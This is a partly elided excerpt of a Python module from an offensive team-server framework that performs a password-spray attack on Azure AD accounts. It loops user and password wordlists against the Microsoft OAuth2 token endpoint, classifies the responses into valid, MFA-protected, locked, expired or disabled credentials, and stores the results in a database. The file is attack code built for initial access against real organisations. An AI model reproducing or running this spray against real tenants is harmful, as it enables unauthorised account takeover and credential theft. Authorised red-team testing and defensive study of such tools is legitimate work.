# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\initialaccess\azuread_password_spray.py
import json
import sys
...
def exploit(workspace):
    ...
    if (password_wordlist == "" and password == "") or (
        not password_wordlist == "" and not password == ""
    ):
        return {
            "error": "[*] Add at least a password or a password file. Not both though."
        }, 500

    if theemail == "" and userfile == "":
        return {
            "error": "[*] Add at least a username or a user file. Not both though."
        }, 500
        ...
        if not password == "":
            ...
            if not state in [-1, 0, 1, 8, 9]:
                try:
                    emails = models.AzureUsers.objects().get_or_404(
            ...
            if "error" in return_info_dict:
                return {
                    "email": {
                        "email": email.replace("\n", ""),
                        "result": return_info_dict["error"],
                    }
                }, 200

            else:
                return {
                    "email": {"email": email, "result": return_info_dict["message"]}
                }, 200
        else:
            ...
            for passw in pass_file.readlines():
                ...
                if not state in [-1, 0, 1, 8, 9]:
                    try:
                        ...
                        e = str(e)
                        if "Tried to save duplicate unique keys" in e:
                            models.AzureUsers.objects().get(
                                azure_user_email=email
                            ).update(**single_user_info)
                        else:
                            return {"error": e}, 500
            ...
            return {
                "Wordlist": {"Wordlist": password_wordlist, "output": all_output}
            }, 200
    elif not userfile == "":
            ...
            with alive_bar(len(userEmails)) as bar:
                for um in userEmails:
                    for passw in userPass:
                        ...
                        single_user_info = database_info(
                            state, usermail, passw.replace("\n", "")
                        )
                        return_info_dict = return_info(
                            state, usermail, passw.replace("\n", "")
                        )
        ...
        return {"Wordlist": {"Wordlist": userfile, "output": all_output}}, 200
...
def password_spray(user, password):
    ...
    state = -1
    body["username"] = user
    response = requests.post(url + "/common/oauth2/token", headers=headers, data=body)
...
def return_info(state, user, password):
    if state == -1:
        ...
        return {
            "message": "[*] User and password correct: {}:{}".format(user, password)
        }

    elif state == 3:
        return {
            "message": "[*] User and password correct, but requires mfa: {}:{}".format(
                user, password
            )
        }
        ...
        return {
            "message": "[*] User and password correct, but user is locked: {}:{}".format(
                user, password
            )
        }
        ...
        return {
            "message": "[*] User and password correct, but password is expired: {}:{}".format(
                user, password
            )
        }
        ...
        return {
            "message": "[*] User and password correct, but account is disabled: {}:{}".format(
                user, password
            )
        }
        ...
        return {
            "error": f"[*] Invalid user {user} or missing password. Is the user part of an ADFS Account?"
        }
